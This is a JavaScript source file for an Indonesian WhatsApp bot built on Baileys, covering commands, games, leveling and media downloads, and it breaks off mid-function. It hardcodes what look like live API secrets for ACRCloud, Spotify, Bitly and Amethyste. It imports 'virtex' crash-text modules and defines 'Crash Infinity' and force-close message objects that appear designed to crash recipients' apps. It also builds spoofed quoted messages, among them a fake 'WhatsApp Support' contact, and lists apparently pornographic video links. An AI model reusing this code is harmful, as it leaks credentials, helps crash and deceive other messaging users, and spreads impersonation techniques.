"use strict";
const chalk = require('chalk')
const fs = require("fs")
const toMs = require('ms')
const fse = require('fs-extra');
const ra = require("ra-api");
const moment = require("moment-timezone");
const util = require("util");
const { exec, spawn } = require("child_process");
const ffmpeg = require("fluent-ffmpeg");
const axios = require("axios");
const hxz = require("hxz-api");
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI()
const yts = require("yt-search");
const speed = require("performance-now");
const request = require("request");
const ms = require("parse-ms");
const ytdl = require('ytdl-core');
const os = require('os');
const { performance } = require('perf_hooks')
const imageToBase64 = require('image-to-base64');
const fetch = require('node-fetch');
const acrcloud = require("acrcloud");
const acr = new acrcloud({
host: "identify-eu-west-1.acrcloud.com",
access_key: "c9f2fca5e16a7986b0a6c8ff70ed0a06",
access_secret: "PQR9E04ZD60wQPgTSRRqwkBFIWEZldj0G3q7NJuR"
});
const Download = require("@phaticusthiccy/open-apis");
const { SoundCloud } = require("scdl-core");
const CuteFFMPEG = require("cute-ffmpeg").CuteFFMPEG;
const FFMPEGRequest = require("cute-ffmpeg").FFMPEGRequest;
const Ffmpeg = new CuteFFMPEG({
overwrite: true
});
const Spotify = require('spotifydl-core').default
const spotify = new Spotify({
clientId: 'acc6302297e040aeb6e4ac1fbdfd62c3',
clientSecret: '0e8439a1280a43aba9a5bc0a16f3f009'
}) 
const hx = require("hxz-api")
const convert = require('imagemagick')
const gis = require('g-i-s');
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { youtubeSearch, mediafiredl, lyricsv2, lyrics, facebookdl, facebookdlv2, tiktokdl, tiktokdlv2, twitterdl, twitterdlv2, getZodiac, liputan6, googleIt, wallpaperv2, googleImage, jadwalTVNow, gempa, stickerTelegram, stickerLine, latinToAksara, aksaraToLatin, asmaulhusna, asmaulhusnajson, alquran, jadwalsholat, listJadwalSholat, gempaNow } = require('@bochilteam/scraper')
const ameClient = require("amethyste-api")
const ameApi = new ameClient("1f486b04b157f12adf0b1fe0bd83c92a28ce768683871d2a390e25614150d0c8fa404fd01b82a5ebf5b82cbfa22e365e611c8501225a93d5d1e87f9f420eb91b")
const { BitlyClient } = require('bitly');
const bitly = new BitlyClient('7d737131e678fc366699edead8bca146e69f6c78', {});
const stringSimilarity = require("string-similarity");
//================================================================================\\
const { msgFilter, addSpam, unSpam, SpamExpired, cekSpam} = require('../../../../../ACTION/STORAGE/X-FUNC/antispam')
const { color, bgcolor } = require('../../../../../ACTION/STORAGE/X-FUNC/color')
const { WAMessageStubType, generateWAMessageFromContent, downloadContentFromMessage, downloadHistory, proto, getMessage, generateWAMessageContent, prepareWAMessageMedia , generateWAMessage, areJidsSameUser,downloadMediaMessage, makeInMemoryStore } = require("../../../../../ACTION/STORAGE/X-FUNC/WOKER/@adiwajshing/baileys")
const { addInventoriLimit, checkDataLimit, kurangLimit, tambahLimit, getLimit } = require("../../../../../ACTION/STORAGE/X-FUNC/limit");
const { pinterest } = require("../../../../../ACTION/STORAGE/X-FUNC/pinterest")
const { formatp, getCase, kyun, isUrl, fetchJson, fetchText, getGroupAdmins, sleep,getBuffer, reSize} = require("../../../../../ACTION/STORAGE/X-FUNC/myfunc");
const { parseMention, FileSize, weton,week,calender,dateIslamic,formatDate, makeid, generateMessageTag, runtime, randomNomor, jsonformat, generateProfilePicture, h2k, generateMessageID, getRandom} = require('../../../../../ACTION/STORAGE/X-FUNC/functions')
const textpro = require('../../../../../ACTION/STORAGE/X-FUNC/textpro')
const { cerpen } = require('../../../../../ACTION/STORAGE/X-FUNC/cerpen')
const { antivirus } = require('../../../../../ACTION/STORAGE/X-FUNC/antivirus.js')
const { TelegraPh } = require('../../../../../ACTION/STORAGE/X-FUNC/uploader')
const { ghstalk,facebook, kodepos, moddroid, apkmody, happymod, wallpaper, wikimedia, quotesAnime, aiovideodl  } = require('../../../../../ACTION/STORAGE/X-FUNC/scraper') 
const { addblockcmd, deleteblockcmd, checkblockcmd } = require("../../../../../ACTION/STORAGE/X-FUNC/blockcmd");
const { clearAllBan, addBanned, unBanned, cekBannedUser } = require("../../../../../ACTION/STORAGE/X-FUNC/banned")
const { addError,clearAllError, deleteError, checkError } = require("../../../../../ACTION/STORAGE/X-FUNC/totalerror")
const { clearAllOwner, clearAllPremium, getDateId, clearAllUser, gethitUser, resetLevelingXp, userXp, userLeveling, getLevelingXp, getLevelingLevel, getLevelingId, addLevelingXp, addLevelingLevel, addUserId, checkHit, AddHit, addRegist, cekRegist } = require("../../../../../ACTION/STORAGE/X-FUNC/user");
const { Nothing, Failed, Succes, addAutoClear, autoClearChat, checkAutoClear, checkDataName, createDataId, getDataId, addDataId, removeDataId, checkDataId, checkClaim, getClaim, expiredClaim, addUserClaim, getHit, cmdAdd, expiredCmd } = require("../../../../../ACTION/STORAGE/X-FUNC/totalcmd");
const { addBlock, unBlock, cekBlock } = require("../../../../../ACTION/STORAGE/X-FUNC/blockuser");
const { tebakkimia, asahotak, susunkata, tebakkalimat, tekateki, caklontong, tebakbendera, tebakanime, tebakkabupaten, tebaklagu, tebaklirik } = require('../../../../../ACTION/STORAGE/X-FUNC/index.js') 
const { addInventoriDarah, cekDuluJoinAdaApaKagaDiJson, addDarah, kurangDarah, getDarah } = require('../../../../../ACTION/STORAGE/X-FUNC/darah.js')
const { cekInventoryAdaAtauGak, addInventori, addBesi, addEmas, addEmerald, addUmpan, addPotion, kurangBesi, kurangEmas, kurangEmerald, kurangUmpan, kurangPotion, getBesi, getEmas, getEmerald, getUmpan, getPotion } = require('../../../../../ACTION/STORAGE/X-FUNC/alat_tukar.js')
const { addInventoriMonay, cekDuluJoinAdaApaKagaMonaynyaDiJson, addMonay, kurangMonay, getMonay } = require('../../../../../ACTION/STORAGE/X-FUNC/monay.js')
const { cekDuluHasilBuruanNya, addInventoriBuruan, addIkan, addAyam, addKelinci, addDomba, addSapi, addGajah, kurangIkan, kurangAyam, kurangKelinci, kurangDomba, kurangSapi, kurangGajah, getIkan, getAyam, getKelinci, getDomba, getSapi, getGajah } = require('../../../../../ACTION/STORAGE/X-FUNC/buruan.js')  
//================================================================================\\
const { virtex1, virtag, philip, emoji1, emoji2, virtex2, virtex3, virtex4, virtex5, virtex8, virtex9, virtex10, virtex11, virtex12, slayer, ngazap, virtexbytsukasa } = require('../../../../../ACTION/STORAGE/X-ABY/virtex.js')
const { virtex6 } = require('../../../../../ACTION/STORAGE/X-ABY/virtex6.js')
const { virtex7 } = require('../../../../../ACTION/STORAGE/X-ABY/virtex7.js')
const { ngazapv1 } = require('../../../../../ACTION/STORAGE/X-ABY/ngazapv1') 
const { ngazapv2 } = require('../../../../../ACTION/STORAGE/X-ABY/ngazapv2') 
const { ngazapv3 } = require('../../../../../ACTION/STORAGE/X-ABY/ngazapv3')
//================================================================================\\
const { menu1, fitur1 } = require('../../../../../ACTION/STORAGE/X-DEV/menu1')
const { menu2, fitur2 } = require('../../../../../ACTION/STORAGE/X-DEV/menu2')
const { menu3, fitur3 } = require('../../../../../ACTION/STORAGE/X-DEV/menu3')
const { spam1, spam2, istigfar, hanyaadmin, jadiinadmin, ucapsalam, samasama, kumsalam, khususowner, katakasar } = require("../../../../../ACTION/STORAGE/X-DEV/stickerPack.js");
const { bad, menu, tekssalah, katahai, katamalem, katasiang, katasore, katalopyou, tekscmd, teksspam, ilhamberkata, ngebucin, badud, ohayo, salam, thanks, anime, dosa, devoloper1, devoloper2} = require("../../../../../ACTION/STORAGE/X-DEV/message.js");
const { ucapsalamikum, enggakmau, ucapmalam, ucapsiang, ucappagi, botz, unregister, ucaphai, toxicbro, spamnih, loplop, sangebro } = require("../../../../../ACTION/STORAGE/X-DEV/vn")
//================================================================================\\
const Exif = require("../../../../../ACTION/STORAGE/X-FUNC/exif")
const exif = new Exif()
//================================================================================\\
const oawalah =['iya kak ?','Ada apa kak ?','Bot aktif kak','Aku bukan bot kak, aku ini hooman','Kumaha atuh kak ?','Kunaon kak ?','oy ?','ya ?','Kenapa panggil aku','Ada apa kak kok panggil aku','Naon siah kehed manggil manggil']
const hayuk = oawalah[Math.floor(Math.random() * oawalah.length)] 
const b1 = ["pukulin","kocok"]
const bully1 = b1[Math.floor(Math.random() * b1.length)]
const b2 = ["gebukin","santet"]
const bully2 = b2[Math.floor(Math.random() * b2.length)]
const b3 = ["sayang","peluk"]
const bully3 = b3[Math.floor(Math.random() * b3.length)]
const randombokep = ["https://d.top4top.io/m_23276fn4k0.mp4","https://e.top4top.io/m_2327lpyjx1.mp4","https://f.top4top.io/m_2327ecxse2.mp4","https://g.top4top.io/m_2327s1vkm3.mp4","https://i.top4top.io/m_232707qxd5.mp4","https://j.top4top.io/m_2327d16ad6.mp4","https://k.top4top.io/m_2327cwvt27.mp4","https://l.top4top.io/m_2327t08r98.mp4","https://h.top4top.io/m_2327kv7dk4.mp4","https://b.top4top.io/m_2328yetob0.mp4","https://b.top4top.io/m_2328yetob0.mp4","https://c.top4top.io/m_23282ag451.mp4","https://d.top4top.io/m_2328uck8k2.mp4","https://e.top4top.io/m_232818z043.mp4","https://l.top4top.io/m_23289plkq0.mp4","https://a.top4top.io/m_23281toko1.mp4","https://b.top4top.io/m_23285rxky2.mp4","https://c.top4top.io/m_2328liezp3.mp4","https://d.top4top.io/m_2328mh11a4.mp4","https://e.top4top.io/m_2328jvc1u5.mp4","https://f.top4top.io/m_23282xa0e6.mp4","https://g.top4top.io/m_2328p9c7o7.mp4","https://g.top4top.io/m_2328q19nl0.mp4","https://h.top4top.io/m_2328ljgut1.mp4","https://i.top4top.io/m_23286c8712.mp4","https://j.top4top.io/m_2328qqgb53.mp4","https://k.top4top.io/m_2328ktj4r4.mp4"]
const bokep = randombokep[Math.floor(Math.random() * randombokep.length)]  
const randomcok = ['XM1','XM2','XM3','XM4','XM5','XM6','XM7']
const randomfoto = randomcok[Math.floor(Math.random() * (randomcok.length))]
const ofrply = fs.readFileSync(`./ACTION/PLICE/FOTO/${randomfoto}.jpg`) 
const dfrply = fs.readFileSync(`./ACTION/PLICE/FOTO/thumbnaildokumen.jpg`) 
//================================================================================\\
const register = JSON.parse(fs.readFileSync('./ACTION/STORAGE/X-DATA/register.json'))
const AntiSpam = JSON.parse(fs.readFileSync('./ACTION/STORAGE/X-DATA/antispam.json'));
const DataId = JSON.parse(fs.readFileSync('./ACTION/STORAGE/X-DATA/data.json'))
const Own = JSON.parse(fs.readFileSync('./ACTION/STORAGE/X-DATA/owner.json'))
const listcmdblock = JSON.parse(fs.readFileSync('./ACTION/STORAGE/X-DATA/blockcmd.json'))
const ban = JSON.parse(fs.readFileSync('./ACTION/STORAGE/X-DATA/banned.json'))
const listerror = JSON.parse(fs.readFileSync('./ACTION/STORAGE/X-DATA/listerror.json'))
const setiker = JSON.parse(fs.readFileSync('./ACTION/STORAGE/X-DATA/stick.json'))
const audionye = JSON.parse(fs.readFileSync('./ACTION/STORAGE/X-DATA/vn.json'))
const user = JSON.parse(fs.readFileSync('./ACTION/STORAGE/X-DATA/user.json'))
const _buruan = JSON.parse(fs.readFileSync('./ACTION/STORAGE/X-DATA/hasil_buruan.json'));
const hitnya = JSON.parse(fs.readFileSync('./ACTION/STORAGE/X-DATA/hitToday.json'))
const _claim = JSON.parse(fs.readFileSync('./ACTION/STORAGE/X-DATA/claim.json'))
const blocked = JSON.parse(fs.readFileSync('./ACTION/STORAGE/X-DATA/userblocked.json'))
const dash = JSON.parse(fs.readFileSync('./ACTION/STORAGE/X-DATA/dashboard.json'))
const Premium = JSON.parse(fs.readFileSync('./ACTION/STORAGE/X-DATA/premium.json'))
const allcommand = JSON.parse(fs.readFileSync('./ACTION/STORAGE/X-DATA/allcommand.json'));
//================================================================================\\
const _tbkkimia = JSON.parse(fs.readFileSync('./ACTION/STORAGE/X-DATA/GAME/tebakkimia.json'))
const _asahotak = JSON.parse(fs.readFileSync('./ACTION/STORAGE/X-DATA/GAME/asahotak.json'))
const _susunkata = JSON.parse(fs.readFileSync('./ACTION/STORAGE/X-DATA/GAME/susunkata.json'))
const _tebakkalimat = JSON.parse(fs.readFileSync('./ACTION/STORAGE/X-DATA/GAME/tebakkalimat.json'))
const _tekateki = JSON.parse(fs.readFileSync('./ACTION/STORAGE/X-DATA/GAME/tekateki.json'))
const _caklontong = JSON.parse(fs.readFileSync('./ACTION/STORAGE/X-DATA/GAME/caklontong.json'))
const _tebakbendera = JSON.parse(fs.readFileSync('./ACTION/STORAGE/X-DATA/GAME/tebakbendera.json'))
const _tebakanime = JSON.parse(fs.readFileSync('./ACTION/STORAGE/X-DATA/GAME/tebakanime.json'))
const _tebakkabupaten = JSON.parse(fs.readFileSync('./ACTION/STORAGE/X-DATA/GAME/tebakkabupaten.json'))
const _tebaklirik= JSON.parse(fs.readFileSync('./ACTION/STORAGE/X-DATA/GAME/tebaklirik.json'))
const _tebaklagu= JSON.parse(fs.readFileSync('./ACTION/STORAGE/X-DATA/GAME/tebaklagu.json'))
//================================================================================\\
/*           Recodenya yang teliti ya sayang                                                                              */                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
/*           ntar klo error jangan salahin gua                                                  */                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            let Owneren = `${nomerOwner}@s.whatsapp.net`
//================================================================================\\
module.exports = async(xdev, dev, m, store) => {
try {
const { type, now, fromMe } = dev
const Id =  dev.key.id
const antibot = dev.isBaileys
const content = JSON.stringify(dev.message)
const from  = dev.key.remoteJid
const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
const body = (type === 'conversation') ? dev.message.conversation : (type == 'imageMessage') ? dev.message.imageMessage.caption : (type == 'videoMessage') ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') ? dev.message.extendedTextMessage.text : (type == 'buttonsResponseMessage') ? dev.message.buttonsResponseMessage.selectedButtonId : (type == 'listResponseMessage') ? dev.message.listResponseMessage.singleSelectReply.selectedRowId : (type == 'templateButtonReplyMessage') ? dev.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (dev.message.buttonsResponseMessage?.selectedButtonId || dev.message.listResponseMessage?.singleSelectReply.selectedRowId ) : ''
const pes = (type === 'conversation' && dev.message.conversation) ? dev.message.conversation : (type == 'imageMessage') && dev.message.imageMessage.caption ? dev.message.imageMessage.caption : (type == 'videoMessage') && dev.message.videoMessage.caption ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') && dev.message.extendedTextMessage.text ? dev.message.extendedTextMessage.text : ''
const messagesD = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
const messagesC = pes.slice(0).trim()


if (multi){
var prefix = /^[°zZ#@+,.?=''():√%!¢£¥€π¤ΠΦ&<`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#@+,.?=''():√%¢£¥€π¤ΠΦ&<!`™©®Δ^βα¦|/\\©^]/gi) : '.'
var thePrefix = "Multi Prefix"
} else if (nopref){
var  prefix = ''
var thePrefix ="No prefix"
} else if (allpref){
var prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα~¦|/\\©^]/gi) : ''
var thePrefix ="All Prefix"
} else {
prefix = prefa
var thePrefix = prefa
}



const budy = (type === 'conversation') ? dev.message.conversation : (type === 'extendedTextMessage') ? dev.message.extendedTextMessage.text : ''
const selectedButton = (type == 'buttonsResponseMessage') ? dev.message.buttonsResponseMessage.selectedButtonId : ''
const responseButton = (type == 'listResponseMessage') ? dev.message.listResponseMessage.title : ''                        
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const isCmd = body.startsWith(prefix)
const q = args.join(' ')
const c = args.join(" ")
const timeWib = moment().tz('Asia/Jakarta').format('HH:mm:ss')
const timeWit= moment().tz('Asia/Makassar').format('HH:mm:ss')
const timeWita = moment().tz('Asia/Jayapura').format('HH:mm:ss')
const botNumber = xdev.user.id ? xdev.user.id.split(":")[0]+"@s.whatsapp.net" : xdev.user.id
const isGroup = from.endsWith('@g.us')
const sender = isGroup ? (dev.key.participant ? dev.key.participant : dev.participant) : dev.key.remoteJid
const senderNumber = sender.split("@")[0] 
const Ownerin = devoloper1? devoloper1 : devoloper2? devoloper2 : false
const devoloper3 = dev.key.fromMe
const ownerNumber = Ownerin? Ownerin : Owneren? Owneren : false
const isDev = ownerNumber.includes(sender)
const isOwn = Own.includes(sender)
const theOwner = sender == Ownerin
const totalchat = await store.chats.all().map(v => v.id)
const totalGroup = totalchat.filter(v => v.endsWith('g.us'))
const groupMetadata = isGroup ? await xdev.groupMetadata(from) : ""
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.jid : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupDesc = isGroup ? groupMetadata.desc : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const pushname = dev.pushName || "No Name"
const chatss = (type === 'conversation') ? dev.message.conversation : (type === 'extendedTextMessage') ? dev.message.extendedTextMessage.text : ''
const forward = { forwardingScore: 10000000, isForwarded: true, sendEphemeral: true}
const text = args.join(" ")
const timestampp = speed();
const latensi = speed() - timestampp
const arg = budy.slice(command.length + 2, budy.length)
const itsMe = sender == botNumber ? true : false
const mentionByTag = type == "extendedTextMessage" && dev.message.extendedTextMessage.contextInfo != null ? dev.message.extendedTextMessage.contextInfo.mentionedJid : []
const mentionByReply = type == "extendedTextMessage" && dev.message.extendedTextMessage.contextInfo != null ? dev.message.extendedTextMessage.contextInfo.participant || "" : ""
const quoted = dev.quoted ? dev.quoted : dev
const mime = (quoted.msg || quoted).mimetype || ''
const users = mentionByReply? mentionByReply : mentionByTag[0]
const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
mention != undefined ? mention.push(mentionByReply) : []
const mentionUser = mention != undefined ? mention.filter(n => n) : []
const isHit = checkHit(senderNumber, user)   
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const numberQuery = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
const input = mentionByTag[0]? mentionByTag[0] : mentionByReply ? mentionByReply : q? numberQuery : false
const isMiminya = Own.includes(input)
const isPremnya = Premium.includes(input)
const isOwner = isDev? isDev : isOwn? isOwn : devoloper3? devoloper3 : false
const isLimit = kurangLimit(sender, 1)
//===============================================================================\\
const userLevel = getLevelingLevel(senderNumber, user)
const userExp = getLevelingXp(senderNumber, user)
const userId = getLevelingId(senderNumber, user)
const amountExp = Math.floor(Math.random() * 10) + 50
const requiredExp = 1000 * userLevel
const userPersen = userExp/requiredExp*100
const userVerified = getDateId(senderNumber, user) 
//================================================================================\\
require("../../../../../ACTION/STORAGE/X-DEV/mess.js")(senderNumber, prefix,command)
//================================================================================\\
const DarahAwal = rpg.darahawal
const isDarah = cekDuluJoinAdaApaKagaDiJson(sender)   
const isCekDarah = getDarah(sender)
const isUmpan = getUmpan(sender)
const isPotion = getPotion(sender)
const isIkan = getIkan(sender)
const isAyam = getAyam(sender)
const iskelinci = getKelinci(sender)
const isDomba = getDomba(sender)
const isSapi = getSapi(sender)
const isGajah = getGajah(sender)
const isMonay = getMonay(sender)
const isBesi = getBesi(sender)
const isEmas = getEmas(sender)
const isEmerald = getEmerald(sender)
const isInventory = cekInventoryAdaAtauGak(sender)
const isInventoriBuruan = cekDuluHasilBuruanNya(sender)
const isInventoryLimit = checkDataLimit(sender)
const isInventoryMonay = cekDuluJoinAdaApaKagaMonaynyaDiJson(sender)
const ikan = ['🐟','🐠','🐡']   
//================================================================================\\
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupOwner = isGroup ? groupOwner == sender : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const isRegist = cekRegist(sender)
const isBaned = cekBannedUser(sender)
const isUserLimit = checkDataLimit(sender)
const isAntiLink = checkDataId("antilink", from, DataId) 
const isAntiVirtex = checkDataId("antivirtex", from, DataId) 
const isKickarea = checkDataId("antiasing", from, DataId) 
const isAntilinkGc = checkDataId("antilinkgc", from, DataId) 
const isBanchat = checkDataId("banchat", from, DataId) 
const isAntihidetag = checkDataId ("antihidetag", from, DataId) 
const isDevoloper = isOwner ? true : Premium.includes(sender)
//================================================================================\\

const iyakak = botz[Math.floor(Math.random() * botz.length)]              
const ucapbot = fs.readFileSync(iyakak)

//Vn saat command tidak ditemukan
const unreg = unregister[Math.floor(Math.random() * unregister.length)]              
const gakada = fs.readFileSync(unreg)

//Vn saat ada yang sange
const lusange = sangebro[Math.floor(Math.random() * sangebro.length)]              
const sangeya = fs.readFileSync(lusange)

//VN saat ada yang toxic
const anying = toxicbro[Math.floor(Math.random() * toxicbro.length)]              
const astaga = fs.readFileSync(anying)

//VN saat ada yg akses fitur owner
const ahenggak = enggakmau[Math.floor(Math.random() * enggakmau.length)]              
const gakmau = fs.readFileSync(ahenggak)

//VN saat ada yg bilang selamat pagi
const ay = ucappagi[Math.floor(Math.random() * ucappagi.length)]
const oahyo = fs.readFileSync(ay)

//VN saat ada yg bilang selamat malam
const ayuk = ucapmalam[Math.floor(Math.random() * ucapmalam.length)]
const oyasumi = fs.readFileSync(ayuk)

//VN saat ada yg bilang selamat siang
const yayuk = ucapsiang[Math.floor(Math.random() * ucapsiang.length)]
const koniciwa = fs.readFileSync(yayuk)

//VN saat ada yg spam
const alal = spamnih[Math.floor(Math.random() * spamnih.length)]
const nospam = fs.readFileSync(alal)

//VN saat ada yg bilang halo
const ulul = ucaphai[Math.floor(Math.random() * ucaphai.length)]
const moshimos = fs.readFileSync(ulul)

//VN saat ada yg bilang asalamualaikum
const alul = ucapsalamikum[Math.floor(Math.random() * ucapsalamikum.length)]
const walaikumsalam = fs.readFileSync(alul)

//VN saat ada yg bilang i love u
const awlu = loplop[Math.floor(Math.random() * loplop.length)]
const lopyoutoo = fs.readFileSync(awlu) 

const textcmd = tekscmd[Math.floor(Math.random() * tekscmd.length)]                         
const textspam = teksspam[Math.floor(Math.random() * teksspam.length)]                         

//================================================================================\\

xdev.sendReadReceipt(from, sender, [dev.key.id])
if (isCmd){
xdev.sendPresenceUpdate('composing', from)
} else {
xdev.sendPresenceUpdate('available', from)
}
//================================================================================\\
// image Pake Pp Org
try {
var ppimg = await xdev.profilePictureUrl(sender, 'image')
} catch (err) {
console.log(err)
var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
const thumb = await getBuffer(ppimg)
const efrply = await reSize(ofrply, 300, 300)
const zreply = await reSize(ppimg, 300, 300)
//================================================================================\\
if(timeWib < "23:59:00"){ var ucapanWaktu = 'Selamat malam' }
if(timeWib < "19:00:00"){ var ucapanWaktu = 'Selamat malam'}
if(timeWib < "18:00:00"){ var ucapanWaktu = 'Selamat sore'}
if(timeWib < "15:00:00"){ var ucapanWaktu = 'Selamat siang'}
if(timeWib < "11:00:00"){ var ucapanWaktu = 'Selamat pagi'}
if(timeWib < "06:00:00"){ var ucapanWaktu = 'Selamat pagi'  }       
//================================================================================\\
const ftoko = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {"productMessage": {"product": {"productImage":{"mimetype": "image/jpeg","jpegThumbnail": thumb},"title": `${pushname}`,"description": `${ucapanWaktu} kak`,"currencyCode": "IDR", "priceAmount1000": `${pushname}`, "retailerId": `Rp10`,"productImageCount": 1},"businessOwnerJid": `0@s.whatsapp.net`}}}
const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `0@s.whatsapp.net` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': thumb}}}
const ftext = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${botName}`,"title": `Hmm`,'jpegThumbnail': thumb}}}
const ftroli = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {orderMessage: {itemCount : 200, status: 1,surface : 2,message: `${botName}\n${ucapanWaktu} kak`,orderTitle: `${ucapanWaktu} kak`,thumbnail: thumb, sellerJid: `0@s.whatsapp.net`}}}
const floc = { key: {"fromMe": false,"participant": `0@s.whatsapp.net`, "remoteJid": "6289530863358-1621036495@g.us" },message: { "liveLocationMessage": { "title":`${botName}`,'jpegThumbnail': thumb}}}
const fimage = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: {"imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": botName, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": thumb, "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
const fdoc = { key : { participant : '0@s.whatsapp.net'}, message: { documentMessage: { title: 'Halo bang', jpegThumbnail: thumb}}}
const fvid = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":"hallo bang","h": `Hmm`,'seconds': '30', 'caption': 'Halo bang','jpegThumbnail': thumb}}}
const fgc = {"key": {"fromMe": false,"participant": "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "mememteeeekkeke","groupName": "P", "caption": "Halo bang jagoo", 'jpegThumbnail': thumb}}}
const fgif = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: {  "videoMessage": {  "title":"Lol Lexxy+", "h": `Hmm`, 'seconds': "30",  'gifPlayback': 'true',  'caption': 'Lol Lexxy+', 'jpegThumbnail': thumb}}} 
const fvn = {key: { fromMe: false,participant: `62882000383955@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds": "30","ptt": "true"}}}
//================================================================================\\
const bugquoted = { key: { fromMe: true, participant: `6285870017326@s.whatsapp.net`, ...({ remoteJid: "" }) }, message: { "imageMessage": { "mimetype": "image/jpeg", "caption": `Crash Infinity!!`, "jpegThumbnail": thumb}}}
const bugfc = {key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) }, message: { "imageMessage": { "mimetype": "image/jpeg", "caption": `Kok Fc Bang`, "jpegThumbnail": thumb}}}
const bugkon = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },"message": {"contactMessage": {"displayName": "WhatsApp Support","vcard": "BEGIN:VCARD\nVERSION:3.0\nN:Support;WhatsApp;;;\nFN:WhatsApp Support\nORG:WhatsApp Support\nTITLE:\nitem1.TEL;waid=6288226703423:+62 882-2670-3423\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-NAME:WhatsApp Support\nEND:VCARD"}}}
//================================================================================\\
if(Qoted === "ftoko"){
var setQuoted = ftoko
} else if(Qoted === "fkontak"){
var setQuoted = fkontak
} else if(Qoted === "ftext"){
var setQuoted = ftext
}else if(Qoted === "ftroli"){
var setQuoted = ftroli
} else if(Qoted === "floc"){
var setQuoted = floc
} else if(Qoted === "fimage"){
var setQuoted = fimage
} else if(Qoted === "fdoc"){
var setQuoted = fdoc
} else if(Qoted === "fvid"){
var setQuoted = fvid
} else if(Qoted === "fgc"){
var setQuoted = fgc
} else if(Qoted === "fgif"){
var setQuoted = fgif
} else if(Qoted === "fvn"){
var setQuoted = fvn
} else if(Qoted === "dev"){
var setQuoted = dev
}
//================================================================================\\
const setReply = async(teks) =>{ 
if(!orquoted && replyType === "web2"){
xdev.sendMessage(from, { contextInfo: { externalAdReply:{ showAdAttribution: true, title: `hallo kak👋 ${pushname}`,body:'DONT CLICK HERE',previewType:"PHOTO",thumbnail: thumb, sourceUrl:`https://wa.me/${nomerOwner}?text=${textreply}`}}, text: teks },{quoted: setQuoted})
} else if(orquoted && replyType === "web2"){
xdev.sendMessageV2(from, { contextInfo: { externalAdReply: { showAdAttribution: true, title: `hallo kak👋 ${pushname}`,body:'DONT CLICK HERE',previewType:"PHOTO",thumbnail: thumb, sourceUrl:`https://wa.me/${nomerOwner}?text=${textreply}`}}, text: teks },{quoted: setQuoted})
} else if(!orquoted && replyType === "web"){
